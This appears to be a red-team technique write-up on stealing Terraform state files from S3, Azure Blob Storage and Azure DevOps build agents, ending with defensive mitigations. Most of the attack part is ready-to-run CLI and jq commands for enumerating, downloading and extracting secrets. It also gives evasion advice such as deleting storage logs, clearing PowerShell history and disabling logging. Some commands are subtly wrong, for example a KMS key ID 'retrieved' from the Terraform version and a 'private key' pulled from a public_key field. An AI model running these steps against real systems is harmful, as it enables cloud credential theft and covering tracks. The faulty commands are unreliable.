# [SUPPLY-CHAIN-009]: Terraform State File Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-009 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID / DevOps |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Terraform 0.11+ (all versions affected) |
| **Patched In** | N/A - Inherent to Terraform state design; requires operational mitigations |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Terraform state files (`.tfstate`) are JSON-formatted repositories that store the complete state of managed cloud infrastructure, including sensitive metadata, resource configurations, and credentials. An attacker with access to these files gains the ability to read, modify, or delete infrastructure definitions, steal embedded secrets (database passwords, API keys, SSH keys, SSL certificates), and execute arbitrary infrastructure changes through the Terraform pipeline. The attack typically targets state files stored in insecure remote backends (S3 buckets without encryption or proper access controls), Azure Storage Containers with overly permissive firewall rules, or state files exposed in version control systems, CI/CD pipeline logs, or developer workstations.

**Attack Surface:** Remote state backends (AWS S3, Azure Blob Storage, Terraform Cloud), Azure DevOps Pipeline secure files libraries, Git repositories (public or private with weak access controls), developer local workstations, and CI/CD build agent caches.

**Business Impact:** **Complete Infrastructure Compromise**. An attacker with access to production Terraform state files can exfiltrate all embedded secrets, modify infrastructure to create persistent backdoors, redirect traffic, disable security controls, or delete critical resources. The European Space Agency breach (January 2026) demonstrated the severity: attackers stole 200GB of data including Terraform files, CI/CD pipelines, and hardcoded credentials from a single week of repository access, enabling supply chain attacks against 23 member states.

**Technical Context:** This attack typically requires 5-15 minutes of hands-on execution once access to the remote backend is obtained. The attack surface is vast because Terraform state files are accessed by: (1) developer workstations during `terraform plan` and `terraform apply` operations, (2) CI/CD agents executing deployment pipelines, (3) Terraform Cloud/Enterprise workers if using managed services, and (4) backup and disaster recovery systems. Detection is difficult because state file access is legitimate operational activity; distinguishing malicious access from routine backups or maintenance requires behavioral analysis and strict access logging.

### Operational Risk
- **Execution Risk:** Critical - Irreversible infrastructure damage possible (deletion of databases, public exposure of internal systems, ransomware deployment). Some modifications detectable only through forensic audit log analysis days or weeks post-incident.
- **Stealth:** Medium - File access is logged in cloud audit systems (CloudTrail, Azure Activity Logs), but logs are often not monitored or are stored in a format attackers can also access if they compromise the environment.
- **Reversibility:** Partial - Infrastructure state can be recovered from backups, but only if backups are versioned separately from live state and protected from the same compromised credentials/access paths.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.20, 3.1-3.5 | Secure backend storage, encryption, access logging |
| **DISA STIG** | SI-4, SC-7 | Security system monitoring and boundary protection |
| **CISA SCuBA** | CM-2, CM-5, CM-6 | Configuration management baseline, access restrictions |
| **NIST 800-53** | AC-3, AC-6, SC-7, SI-4, SC-28 | Access control, least privilege, boundary protection, encryption at rest |
| **GDPR** | Art. 32, Art. 5(1)(f) | Security of processing, integrity and confidentiality of data |
| **DORA** | Art. 9, Art. 16 | Protection and prevention; ICT risk management |
| **NIS2** | Art. 21, Art. 25 | Cyber risk management, detection and response |
| **ISO 27001** | A.9.2.3, A.12.2.1, A.13.1.1 | Management of privileged access, asset management, encryption |
| **ISO 27005** | 8.3.1, 8.3.2 | Configuration control and change management |

---

## 2. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: S3 Bucket Enumeration and State File Extraction (AWS)

**Supported Versions:** Terraform 0.11+, all AWS SDK versions

#### Step 1: Enumerate S3 Buckets Matching Terraform Naming Conventions
**Objective:** Identify candidate S3 buckets that may contain Terraform state files by scanning for common naming patterns (e.g., `terraform-state-*`, `*-tfstate*`, `prod-terraform-*`).

**Command (AWS CLI):**
```bash
# List all S3 buckets accessible to current credentials
aws s3api list-buckets --output table

# Scan buckets for Terraform state naming patterns
aws s3api list-buckets --output json | \
  jq '.Buckets[].Name' | \
  grep -i -E '(terraform|tfstate|state)'
```

**Expected Output:**
```
Name: terraform-state-prod
Name: company-tfstate-backend
Name: dev-terraform-configs
Name: legacy-infrastructure-state
```

**What This Means:**
- Each bucket listed is a potential target containing Terraform state files or configuration data.
- Buckets with names containing `terraform`, `tfstate`, or `state` are high-confidence targets.
- The current AWS credentials must have `ListBucket` permission; if this command fails with `Access Denied`, the attached policy is more restrictive, but lateral movement or privilege escalation may still be possible.

**OpSec & Evasion:**
- AWS CloudTrail logs all `ListBuckets` API calls with the principal ARN, timestamp, and source IP. To evade detection: (1) perform enumeration during normal business hours when DevOps activity is high, (2) use assumed roles associated with legitimate service accounts, (3) minimize the time between enumeration and exploitation, (4) consider using AWS CLI with credentials from a compromised CI/CD pipeline token rather than direct AWS access keys.
- Detection likelihood: High (CloudTrail captures all API calls; if SOC monitors for enumeration patterns, this will be flagged within minutes to hours).

**Troubleshooting:**
- **Error:** `An error occurred (AccessDenied) when calling the ListBuckets operation`
  - **Cause:** Current AWS credentials do not have permission to list S3 buckets.
  - **Fix:** If you have valid credentials from a CI/CD pipeline or service principal, switch to those credentials using `aws configure --profile <profile_name>`. Alternatively, if you have valid Entra ID credentials with cross-cloud federation enabled, attempt to assume an AWS role via Azure AD OIDC token.

#### Step 2: Check Bucket Access Controls and Encryption Status
**Objective:** Verify whether the identified S3 bucket is publicly accessible or has encryption enabled, which determines exploitation difficulty.

**Command (AWS CLI):**
```bash
# Check if bucket is publicly accessible
aws s3api get-bucket-acl --bucket <BUCKET_NAME>

# Check block public access settings
aws s3api get-public-access-block --bucket <BUCKET_NAME> 2>/dev/null || echo "Block public access: Not configured"

# Check encryption status
aws s3api get-bucket-encryption --bucket <BUCKET_NAME> 2>/dev/null || echo "Encryption: Not configured"

# Check bucket versioning
aws s3api get-bucket-versioning --bucket <BUCKET_NAME>
```

**Expected Output (Insecure Configuration):**
```json
{
  "Grants": [
    {
      "Grantee": {
        "Type": "CanonicalUser",
        "ID": "7c6d5..."
      },
      "Permission": "FULL_CONTROL"
    }
  ]
}
```

**What This Means:**
- If `get-bucket-acl` returns entries with `Type: CanonicalUser` or `Type: Group` (especially `AuthenticatedUsers` or `AllUsers`), the bucket permissions are misconfigured.
- If `get-block-public-access` returns `false` for all settings (or errors), public access restrictions are not enabled.
- If encryption is not configured, state files are stored in plaintext; if configured with KMS, you may need the KMS key ARN to decrypt.
- Versioning enables recovery of previous state file versions, which can reveal the progression of infrastructure changes and secrets over time.

**OpSec & Evasion:**
- These read operations are logged in CloudTrail but are typically noisier (high volume of legitimate read operations). To minimize suspicion, batch these checks with legitimate backup or compliance audit operations.
- Detection likelihood: Medium (AWS security tools like AWS Config and Security Hub flag public buckets, but the alert may not be prioritized if the bucket name does not suggest it contains sensitive data).

**Troubleshooting:**
- **Error:** `NoSuchBucketPolicy` or `NoSuchBucket`
  - **Cause:** Bucket does not exist or you lack permission to access bucket metadata.
  - **Fix:** Verify bucket name spelling and ensure your current credentials have `GetBucketPolicy` and `GetBucketAcl` permissions. If you lack these, attempt to list bucket contents directly with `aws s3 ls s3://<BUCKET_NAME>/` to determine if you have read access to objects.

#### Step 3: List and Download Terraform State Files
**Objective:** Enumerate state files within the bucket and download them to the attacker-controlled system for offline analysis and credential extraction.

**Command (AWS CLI):**
```bash
# List all objects in the bucket
aws s3api list-objects-v2 --bucket <BUCKET_NAME> --output table

# Filter for .tfstate files
aws s3api list-objects-v2 --bucket <BUCKET_NAME> --output json | \
  jq '.Contents[] | select(.Key | endswith(".tfstate")) | {Key: .Key, Size: .Size, LastModified: .LastModified}'

# Download all .tfstate files to local directory
aws s3 cp s3://<BUCKET_NAME>/ ./terraform-states/ --recursive --exclude "*" --include "*.tfstate"

# Download specific state file
aws s3api get-object --bucket <BUCKET_NAME> --key terraform.tfstate ./terraform.tfstate
```

**Expected Output:**
```
Key: production/terraform.tfstate
Size: 2048576 bytes
LastModified: 2026-01-09T14:32:15Z

Key: staging/terraform.tfstate
Size: 1024000 bytes
LastModified: 2026-01-08T10:15:22Z
```

**What This Means:**
- Each `.tfstate` file represents a Terraform workspace or environment. Multiple files indicate multiple managed infrastructure stacks.
- File sizes and modification times provide context: large files (>1MB) typically indicate complex infrastructure with many resources and credentials.
- Files modified recently suggest active infrastructure under management, with cached credentials more likely to be valid.

**OpSec & Evasion:**
- S3 `GetObject` and `ListObject` API calls are logged but represent normal backup/restoration activity. To evade detection: (1) retrieve state files during scheduled backup windows, (2) use download acceleration settings to minimize transfer time, (3) if possible, compress state files to reduce transfer size and time in transit.
- Detection likelihood: Medium-High (data exfiltration to attacker IP would be flagged by egress monitoring, but if the attacker's C2 IP appears to be a cloud provider IP or legitimate backup service, detection may be delayed).

**Troubleshooting:**
- **Error:** `InvalidStorageClass` or `NoSuchKey`
  - **Cause:** State file was deleted or moved to a different key path, or the bucket uses object locking.
  - **Fix:** Check bucket versioning to retrieve a previous version of the state file: `aws s3api list-object-versions --bucket <BUCKET_NAME>`. If versioning is enabled, download the previous state version: `aws s3api get-object --bucket <BUCKET_NAME> --key terraform.tfstate --version-id <VERSION_ID> ./terraform.tfstate.backup`.

#### Step 4: Parse State File and Extract Secrets
**Objective:** Analyze the JSON state file to identify and extract embedded secrets such as database passwords, API tokens, SSH keys, and SSL certificates.

**Command (Bash/jq):**
```bash
# Pretty-print state file to identify resource structure
jq '.' terraform.tfstate | less

# Extract database resource passwords
jq '.resources[] | select(.type == "aws_db_instance") | .instances[].attributes | {db_name, master_username, master_password}' terraform.tfstate

# Extract API keys and tokens
jq '.resources[] | select(.type == "aws_api_gateway_api_key") | .instances[].attributes.value' terraform.tfstate

# Extract RDS credentials in one-liner
jq '.resources[] | select(.type | startswith("aws_")) | .instances[].attributes | select(has("password")) | {type: .type, password}' terraform.tfstate

# Extract SSH keys (private key data)
jq '.resources[] | select(.type == "aws_key_pair") | .instances[].attributes.public_key' terraform.tfstate

# Extract SSL certificates
jq '.resources[] | select(.type == "tls_self_signed_cert") | .instances[].attributes | {cert_pem, private_key_pem}' terraform.tfstate

# Search for all attributes containing "secret", "password", "key", or "token"
jq '.resources[] | .instances[].attributes | with_entries(select(.key | test("secret|password|key|token|credential"; "i")))' terraform.tfstate
```

**Expected Output:**
```json
{
  "db_name": "production_database",
  "master_username": "admin",
  "master_password": "Super$SecureP@ssw0rd!2024"
}

{
  "key": "AKIA1234567890ABCDE",
  "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}
```

**What This Means:**
- Database credentials are directly usable for lateral movement to RDS databases, including modification of database contents, user creation, or exfiltration of all data.
- AWS Access Keys (beginning with `AKIA` or `ASIA`) are directly usable for AWS API calls and can be used to escalate privileges, access additional resources, or create persistence mechanisms.
- SSH keys enable access to EC2 instances and on-premises systems if they are SSH-accessible.
- SSL certificates and private keys enable interception of HTTPS traffic, credential theft from encrypted channels, or spoofing of legitimate services.

**OpSec & Evasion:**
- This step is entirely offline (no network traffic) and therefore undetectable to cloud monitoring systems. The attacker can spend time analyzing the state file without time pressure.
- To avoid leaving artifacts: (1) use a RAM disk to parse state files, leaving no traces on disk, (2) pipe jq output directly to a text file stored in memory, (3) use a secure enclave or trusted execution environment (TEE) if available.
- Detection likelihood: Very Low (no network indicators or API calls generated; detection depends on endpoint monitoring of the attacker's machine).

**Troubleshooting:**
- **Error:** `Cannot index string with string "resources"`
  - **Cause:** The state file may be in Terraform Cloud format (remote state) or encrypted.
  - **Fix:** If the state file is encrypted with a KMS key, you need the KMS key ARN and assume an IAM role with `kms:Decrypt` permission. Retrieve the key ID: `jq '.terraform.version' terraform.tfstate`. Then decrypt: `aws kms decrypt --ciphertext-blob fileb://terraform.tfstate --key-id arn:aws:kms:REGION:ACCOUNT:key/KEY_ID --output text --query Plaintext | base64 -d > terraform.tfstate.decrypted`.

### METHOD 2: Azure Blob Storage State File Theft

**Supported Versions:** Terraform 0.12+, Azure CLI 2.0+

#### Step 1: Enumerate Azure Storage Accounts via Service Principal or Managed Identity
**Objective:** Identify Azure Storage Accounts containing Terraform state files accessible to the current Entra ID credentials.

**Command (Azure CLI):**
```bash
# Login with compromised Service Principal credentials
az login --service-principal -u <CLIENT_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>

# List all Storage Accounts in current subscription
az storage account list --output table

# Filter for accounts with names matching Terraform conventions
az storage account list --output json | \
  jq '.[] | select(.name | test("terraform|state|tfstate"; "i")) | {name, id, location}'

# Get storage account keys (if the current principal has read access)
az storage account keys list --resource-group <RESOURCE_GROUP> --account-name <STORAGE_ACCOUNT_NAME>
```

**Expected Output:**
```
Name: terraformstateprod
ResourceGroup: infrastructure-rg
Location: westeurope

Name: stagingstate
ResourceGroup: staging-rg
Location: eastus2
```

**What This Means:**
- Each storage account found may contain state files in blob containers named `terraform`, `state`, or similar.
- The current Entra ID credentials may have Reader, Contributor, or Owner permissions on the storage account; if permissions allow, you can enumerate containers and download blobs.
- If the storage account has firewall rules configured, you may be limited to accessing it from specific IPs or virtual networks. If the current compromise is from within an approved IP range (e.g., a corporate IP or an Azure VM in the same VNet), access is seamless.

**OpSec & Evasion:**
- Azure Activity Log entries are created for all `list-keys` operations and storage account enumerations. To minimize detection: (1) perform enumeration through a compromised application or VM in the target network (traffic appears to originate from within the VNet), (2) use a stolen JWT token from a legitimate client rather than direct Service Principal authentication.
- Detection likelihood: Medium (Azure AD Sign-in Logs capture token issuance; if the compromised service principal is not typically active, the login event will appear anomalous).

**Troubleshooting:**
- **Error:** `Access denied with status code 403`
  - **Cause:** The current principal does not have Reader or Contributor permissions on the storage account.
  - **Fix:** If the attack is targeting cross-subscription or cross-tenant environments, attempt to use Azure B2B guest account enumeration (`az ad user list --filter "userType eq 'Guest'"`) to identify federated identities that may have broader permissions.

#### Step 2: Enumerate Blob Containers and Identify State Files
**Objective:** List blob containers within the storage account and identify those containing Terraform state files.

**Command (Azure CLI):**
```bash
# Set storage account and key for auth
export STORAGE_ACCOUNT=<STORAGE_ACCOUNT_NAME>
export STORAGE_KEY=$(az storage account keys list --resource-group <RG> --account-name $STORAGE_ACCOUNT --output json | jq -r '.[0].value')

# List all blob containers
az storage container list --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --output table

# List blobs in a specific container
az storage blob list --container-name <CONTAINER_NAME> --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --output table

# Filter for .tfstate files
az storage blob list --container-name <CONTAINER_NAME> --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --output json | \
  jq '.[] | select(.name | endswith(".tfstate")) | {name, properties}'
```

**Expected Output:**
```
Name: tfstate
Lease Status: unlocked

Name: terraform-configs
Lease Status: unlocked

Name: prod/terraform.tfstate
ContentLength: 2097152
LastModified: 2026-01-09T14:32:15Z
```

**What This Means:**
- Blob containers with `Lease Status: unlocked` are actively accessible and not currently locked for modification.
- State files are typically stored with `.tfstate` extension in containers named `terraform`, `tfstate`, or `state`.
- File modification timestamps indicate active infrastructure management; state files modified in the last 24 hours suggest valid, cached credentials within the file.

**OpSec & Evasion:**
- These operations generate Azure Storage diagnostics logs, which are stored in a separate logging container (usually `$logs`). To evade detection: (1) if you compromise a storage account, delete or truncate logs after exfiltration, (2) use Azure CLI from within an Azure VM to make traffic appear internal.
- Detection likelihood: Medium-High (Azure Security Center and Defender for Cloud can flag anomalous blob access patterns, especially if the blob access originates from an unusual IP or is concurrent with other suspicious activities).

**Troubleshooting:**
- **Error:** `The public access level of the container cannot be determined`
  - **Cause:** The container has private access (the default), and storage account credentials are required.
  - **Fix:** Ensure you've set `STORAGE_KEY` correctly. If you don't have the storage account key, attempt to retrieve it via the Azure portal or use `az role assignment list --assignee <YOUR_PRINCIPAL_ID>` to check if you have owner permissions, which allow key retrieval.

#### Step 3: Download Terraform State Files from Azure Blob Storage
**Objective:** Download state files to the attacker's system for offline parsing and credential extraction.

**Command (Azure CLI):**
```bash
# Download a single state file
az storage blob download --container-name <CONTAINER_NAME> \
  --name <BLOB_NAME> \
  --account-name $STORAGE_ACCOUNT \
  --account-key $STORAGE_KEY \
  --file ./terraform.tfstate

# Download all .tfstate files from a container
for blob in $(az storage blob list --container-name <CONTAINER_NAME> --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --output json | jq -r '.[] | select(.name | endswith(".tfstate")) | .name'); do
  az storage blob download --container-name <CONTAINER_NAME> --name "$blob" --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --file "./$blob"
done

# Verify downloaded file
file terraform.tfstate
jq '.terraform_version' terraform.tfstate
```

**Expected Output:**
```
Finished[#############################################] 100.0000%
File downloaded successfully

terraform_version: "1.5.0"
```

**What This Means:**
- Successful download confirms the attacker has read access to the blob. The terraform version in the state file indicates which Terraform version was used to create the infrastructure, which may be relevant for compatibility if the attacker wishes to modify and re-apply the configuration.
- Blob download operations are logged in Azure Storage diagnostics, with the principal identity, timestamp, and IP address recorded.

**OpSec & Evasion:**
- To minimize forensic traces: (1) download during normal backup windows to blend in with scheduled maintenance, (2) use a stolen bearer token from a legitimate user rather than Service Principal authentication.
- Detection likelihood: Medium (Azure Defender for Cloud can flag bulk blob downloads, especially if multiple state files are accessed in rapid succession).

**Troubleshooting:**
- **Error:** `ResourceNotFound: The specified blob does not exist`
  - **Cause:** The blob name or container name is incorrect, or the blob was deleted.
  - **Fix:** Double-check the blob name from the `list` command. If the blob was deleted, check if the storage account has soft delete enabled: `az storage account blob-service-properties show --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY`. If soft delete is enabled, list deleted blobs: `az storage blob list --container-name <CONTAINER_NAME> --account-name $STORAGE_ACCOUNT --account-key $STORAGE_KEY --include d`.

#### Step 4: Parse Azure-Stored State Files for Secrets
**Objective:** Extract credentials and sensitive configuration from Azure-specific Terraform resources.

**Command (Bash/jq):**
```bash
# Extract Azure SQL Database credentials
jq '.resources[] | select(.type == "azurerm_mssql_server") | .instances[].attributes | {administrator_login, administrator_login_password}' terraform.tfstate

# Extract Cosmos DB keys
jq '.resources[] | select(.type == "azurerm_cosmosdb_account") | .instances[].attributes | {primary_master_key, secondary_master_key, primary_readonly_master_key}' terraform.tfstate

# Extract Storage Account keys
jq '.resources[] | select(.type == "azurerm_storage_account") | .instances[].attributes | {storage_account_name, primary_access_key, secondary_access_key}' terraform.tfstate

# Extract Key Vault secrets and keys
jq '.resources[] | select(.type == "azurerm_key_vault_secret") | .instances[].attributes | {name, value}' terraform.tfstate

# Extract application secrets and client IDs
jq '.resources[] | select(.type == "azurerm_app_configuration") | .instances[].attributes | {name, primary_read_key, primary_write_key}' terraform.tfstate

# Comprehensive search for all sensitive data
jq '.resources[] | .instances[].attributes | with_entries(select(.value | type == "string" and (.value | test("^[A-Za-z0-9+/]{40,}={0,2}$"))))' terraform.tfstate
```

**Expected Output:**
```json
{
  "administrator_login": "sqladmin",
  "administrator_login_password": "P@ssw0rd123!AzureSQL"
}

{
  "primary_master_key": "AccountKey==aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789=="
}
```

**What This Means:**
- Azure SQL Database credentials enable direct database access, allowing data exfiltration, modification, or deletion.
- Cosmos DB primary master keys grant full administrative access to the Cosmos DB account, including read/write to all databases and containers.
- Storage Account keys enable full access to all blobs, tables, queues, and file shares within the account.
- Application secrets and service principal credentials enable authentication to Azure resources and SaaS applications integrated with the organization.

**OpSec & Evasion:**
- Offline parsing of the state file (Step 4) generates no network traffic or cloud audit log entries. The attacker can spend unlimited time analyzing and extracting secrets without risk of detection from cloud monitoring systems.
- Detection likelihood: Very Low (no cloud indicators; detection depends on endpoint monitoring of the attacker's analysis system).

**Troubleshooting:**
- **Error:** `jq: error (at <line>): Cannot index null with string`
  - **Cause:** The state file format is corrupt or the resource type does not exist in the infrastructure.
  - **Fix:** Validate state file integrity: `jq empty terraform.tfstate`. If parsing fails, the file may be truncated or corrupted. Try downloading from a backup version if available.

### METHOD 3: CI/CD Pipeline State File Access via Azure Artifacts

**Supported Versions:** Azure DevOps Pipelines, Terraform Enterprise

#### Step 1: Compromise CI/CD Service Connection or Pipeline Variable
**Objective:** Gain access to pipeline variables or service connections that store Terraform state backend credentials (storage account keys, service principal tokens).

**Precondition:** The attacker must have compromised a developer account with access to the Azure DevOps project or a build agent on the network.

**Command (PowerShell, executed from compromised build agent):**
```powershell
# If running inside an Azure DevOps build agent, environment variables may be exposed
Get-ChildItem env: | Where-Object {$_.Name -match "TERRAFORM|STATE|BACKEND|STORAGE|ACCOUNT|KEY|SECRET"}

# Alternative: Check for Terraform backend configuration in the build agent's home directory
Get-ChildItem -Path $env:USERPROFILE\.terraform.d -Recurse 2>/dev/null | Select-Object FullName

# Check build agent logs for exposed credentials
Get-Content C:\agents\agent\work\_tasks\*\task.json -ErrorAction SilentlyContinue | Select-String -Pattern '(password|key|secret|token|credentials)' -AllMatches
```

**Expected Output:**
```
TERRAFORM_BACKEND_KEY=terraform.tfstate
TF_VAR_storage_account_key=DefaultEndpointsProtocol=https;AccountName=...
SERVICE_CONNECTION_KEY=ClientSecret==...
```

**What This Means:**
- Pipeline variables often contain credentials in plaintext (in Azure DevOps, secrets are marked with `secret()` but may still be visible in logs or variable groups).
- Service connections store authentication credentials for accessing external systems, including Azure subscriptions.
- If the attacker can access these variables, they can use the credentials to directly access the state file backend.

**OpSec & Evasion:**
- Accessing build agent environment variables generates no network traffic or cloud audit logs. The compromise is entirely local to the build agent.
- If the build agent is audited, PowerShell command history (`C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`) will record the enumeration commands. To evade: (1) disable PowerShell logging before commands are executed, (2) clear the PowerShell history after extraction.
- Detection likelihood: Low (build agent auditing is often disabled or insufficient; even if enabled, credential extraction is difficult to distinguish from legitimate troubleshooting).

**Troubleshooting:**
- **Error:** `Access is denied` when accessing service connection files
  - **Cause:** Service connections are encrypted and stored in Azure DevOps backend, not on the build agent.
  - **Fix:** If you have compromised a build agent with sufficient permissions, you can use the Azure DevOps REST API to retrieve service connection details: `curl -X GET https://dev.azure.com/<ORG>/<PROJECT>/_apis/serviceendpoint/endpoints/<ENDPOINT_ID> -H "Authorization: Basic $(echo -n ':<PAT>' | base64)"`

---

## 3. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Encrypt Terraform State Files At Rest**
Enable encryption for all remote state backends. For AWS S3, enforce server-side encryption with customer-managed KMS keys.

**Manual Steps (AWS S3 + Terraform Configuration):**
1. Create a customer-managed KMS key:
   ```bash
   aws kms create-key --description "Terraform State Encryption Key"
   ```
2. Update Terraform backend configuration:
   ```hcl
   terraform {
     backend "s3" {
       bucket         = "my-terraform-state"
       key            = "prod/terraform.tfstate"
       region         = "us-west-2"
       encrypt        = true
       kms_key_id     = "arn:aws:kms:us-west-2:123456789012:key/12345678-1234-1234-1234-123456789012"
       dynamodb_table = "terraform-locks"
     }
   }
   ```
3. Apply backend configuration:
   ```bash
   terraform init
   ```

**Manual Steps (Azure Blob Storage + Terraform Configuration):**
1. Create storage account with encryption enabled:
   ```bash
   az storage account create \
     --name terraformstate123 \
     --resource-group infrastructure-rg \
     --sku Standard_GRS \
     --encryption-services blob \
     --https-only
   ```
2. Enable customer-managed keys (CMK) via Azure Key Vault:
   ```bash
   az storage account update \
     --name terraformstate123 \
     --resource-group infrastructure-rg \
     --encryption-key-name tfstate-key \
     --encryption-key-vault /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/infrastructure-rg/providers/Microsoft.KeyVault/vaults/terraform-vault
   ```
3. Update Terraform backend configuration:
   ```hcl
   terraform {
     backend "azurerm" {
       resource_group_name  = "infrastructure-rg"
       storage_account_name = "terraformstate123"
       container_name       = "tfstate"
       key                  = "prod/terraform.tfstate"
       use_oidc             = true
     }
   }
   ```

**Action 2: Implement Strict Access Control on State File Backends**
Restrict access to state files to only authorized principals (service accounts, DevOps engineers) with principle of least privilege.

**Manual Steps (AWS S3 Bucket Policy):**
1. Navigate to **AWS Console** → **S3** → **Select Bucket** → **Permissions** tab
2. Click **Bucket Policy** and configure:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Sid": "DenyPublicAccess",
         "Effect": "Deny",
         "Principal": "*",
         "Action": "s3:*",
         "Resource": [
           "arn:aws:s3:::my-terraform-state",
           "arn:aws:s3:::my-terraform-state/*"
         ],
         "Condition": {
           "Bool": {
             "aws:SecureTransport": "false"
           }
         }
       },
       {
         "Sid": "AllowTerraformExecution",
         "Effect": "Allow",
         "Principal": {
           "AWS": "arn:aws:iam::123456789012:role/terraform-executor"
         },
         "Action": [
           "s3:GetObject",
           "s3:PutObject",
           "s3:DeleteObject"
         ],
         "Resource": "arn:aws:s3:::my-terraform-state/*"
       }
     ]
   }
   ```
3. Click **Save**
4. Verify: Run `aws s3api get-bucket-policy --bucket my-terraform-state` to confirm policy is applied

**Manual Steps (Azure Blob Storage Access Control):**
1. Navigate to **Azure Portal** → **Storage Accounts** → **terraformstate** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. **Role:** Select "Storage Blob Data Contributor"
4. **Assign access to:** "User, group, or service principal"
5. **Members:** Select the Entra ID service principal used for Terraform deployments (e.g., `terraform-ci@company.onmicrosoft.com`)
6. Click **Review + assign**
7. Verify by listing role assignments:
   ```bash
   az role assignment list --resource-group infrastructure-rg --assignee terraform-ci@company.onmicrosoft.com
   ```

**Action 3: Enable State File Locking to Prevent Concurrent Modifications**
Implement state locking to ensure only one Terraform operation modifies state at a time, preventing race conditions and unauthorized modifications.

**Manual Steps (AWS DynamoDB Locking):**
1. Create DynamoDB table for locks:
   ```bash
   aws dynamodb create-table \
     --table-name terraform-locks \
     --attribute-definitions AttributeName=LockID,AttributeType=S \
     --key-schema AttributeName=LockID,KeyType=HASH \
     --billing-mode PAY_PER_REQUEST
   ```
2. Configure Terraform backend (see step 1 of "Encrypt Terraform State Files" above; note `dynamodb_table` setting)
3. Verify locking during `terraform apply`:
   ```bash
   terraform apply -auto-approve  # DynamoDB will create lock entry during operation
   ```

**Manual Steps (Azure Blob Storage Leasing):**
1. Enable state locking in Terraform backend configuration:
   ```hcl
   terraform {
     backend "azurerm" {
       resource_group_name  = "infrastructure-rg"
       storage_account_name = "terraformstate123"
       container_name       = "tfstate"
       key                  = "prod/terraform.tfstate"
       use_oidc             = true
       # Locking is automatic in Azure; no additional config needed
     }
   }
   ```
2. Verify locking is active by checking blob lease status:
   ```bash
   az storage blob show \
     --container-name tfstate \
     --name prod/terraform.tfstate \
     --account-name terraformstate123 \
     --query properties.lease
   ```

### Priority 2: HIGH

**Action 1: Enable Audit Logging and Monitoring for State File Access**
Configure Azure Activity Logs and AWS CloudTrail to capture all access to state file backends and set up alerts for suspicious patterns.

**Manual Steps (AWS CloudTrail for S3 Access Logging):**
1. Navigate to **AWS Console** → **CloudTrail** → **Create trail**
2. **Trail name:** `terraform-state-audit`
3. **S3 bucket for logs:** Create or select dedicated S3 bucket (e.g., `cloudtrail-logs-terraform`)
4. **Enable log file validation:** Yes
5. **CloudWatch Logs:** Enable (choose existing or create new log group: `terraform-state-access`)
6. **Events:** Select "Data events"
7. **Select S3 objects:** Choose the Terraform state bucket
8. **S3 operations:** Select "All S3 data events"
9. Click **Create trail**
10. Verify trail is active: `aws cloudtrail describe-trails --include-shadow-trails`

**Manual Configuration (Azure Activity Logs):**
1. Navigate to **Azure Portal** → **Monitor** → **Activity log**
2. Set **Subscription filter** to target subscription
3. Add **Resource group filter:** `infrastructure-rg`
4. Add **Resource type filter:** `Storage accounts`
5. Monitor for operations: "List Storage Account Keys", "Get Storage Account", "Create Blob Storage"
6. Create alert rule: Click **Create alert rule** in toolbar
7. **Condition:** "Activity Log - Administrative - Storage Account List Keys"
8. **Threshold:** Count = 1 (alert on every occurrence)
9. **Action group:** Create to send notifications to security team

**Action 2: Implement Secrets Scanning in CI/CD Pipelines**
Integrate automated secrets detection tools (e.g., GitGuardian, TruffleHog, Checkov) into CI/CD pipelines to prevent Terraform files with hardcoded secrets from being committed or deployed.

**Manual Steps (Azure DevOps Pipeline with Checkov):**
1. Create file: `.azurepipelines/checkov-scan.yml`
   ```yaml
   trigger:
     - main
   
   pool:
     vmImage: 'ubuntu-latest'
   
   steps:
   - task: UsePythonVersion@0
     inputs:
       versionSpec: '3.10'
     displayName: 'Use Python 3.10'
   
   - script: |
       pip install checkov
     displayName: 'Install Checkov'
   
   - script: |
       checkov -d . --framework terraform --check CKV_TERRAFORM_1,CKV_SECRET_6 --output cli
     displayName: 'Scan Terraform for Secrets'
   
   - task: PublishBuildArtifacts@1
     inputs:
       pathToPublish: '$(Build.ArtifactStagingDirectory)'
       artifactName: 'checkov-results'
   ```
2. Add this pipeline to repository
3. Configure branch policy: **Repos** → **Branches** → **main** → **Branch policies** → **+ Add status policy**
4. Select the Checkov pipeline and set "Required"
5. Commits with secrets detected will fail pipeline

**Action 3: Separate Terraform State by Environment and Access Control**
Isolate production, staging, and development Terraform state in separate backends with different access controls and credentials.

**Manual Steps:**
1. Create separate S3 buckets for each environment:
   ```bash
   for env in dev staging prod; do
     aws s3api create-bucket \
       --bucket terraform-state-$env-$(date +%s) \
       --region us-west-2 \
       --create-bucket-configuration LocationConstraint=us-west-2
   done
   ```
2. Configure Terraform workspaces to target different backends:
   ```hcl
   terraform {
     required_version = ">= 1.0"
   
     backend "s3" {
       # Dynamically configure based on environment
       # This requires external tooling (e.g., backend-config override)
     }
   }
   
   variable "environment" {
     type = string
     validation {
       condition     = contains(["dev", "staging", "prod"], var.environment)
       error_message = "Environment must be dev, staging, or prod."
     }
   }
   ```
